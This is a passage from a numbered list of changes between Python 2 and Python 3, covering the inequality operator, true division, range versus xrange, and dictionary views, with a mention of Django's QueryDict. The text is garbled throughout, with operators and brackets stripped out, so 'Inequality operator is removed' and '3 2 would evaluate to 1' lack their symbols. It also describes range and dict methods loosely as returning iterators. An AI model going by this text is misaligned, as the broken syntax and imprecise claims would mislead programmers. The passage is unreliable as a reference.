 3.  Inequality operator   is removed: Use != instead. 4.  True integer division: In Python 2, 3   2 would evaluate to 1. It will be   correctly evaluated to 1.5 in Python 3.  5.  Use range instead of xrange  : range   will now return iterators as   xrange   used to work before.  6.  Dictionary keys are views: dict and dict-like classes  such as QueryDict   will return iterators instead of lists for the keys  , items  , and values    method calls.
